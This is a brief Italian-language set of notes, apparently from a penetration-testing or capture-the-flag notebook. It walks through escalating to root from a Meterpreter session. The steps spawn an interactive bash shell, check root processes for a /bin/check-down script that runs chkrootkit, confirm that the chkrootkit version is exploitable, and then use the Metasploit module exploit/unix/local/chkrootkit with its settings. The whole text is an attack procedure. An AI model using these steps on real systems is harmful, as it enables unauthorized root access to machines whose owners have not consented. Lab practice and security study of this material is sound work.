SESSIONE METERPRETER

1. `/bin/bash -i` 
2. `ps aux` controlliamo se nell’ **user root** è presente **/bin/bash   /bin/check-down** 
3. `cat /bin/check-down` se è configurato per far avviare **chkrootkit** possiamo proseguire
4. `chkrootkit -V` check per verificare che la versione si sfruttabile
5. `background`
6. `use exploit/unix/local/chkrootkit`
    1. **set CHKROOTKIT /bin/chkrootkit**
    2. **set session**
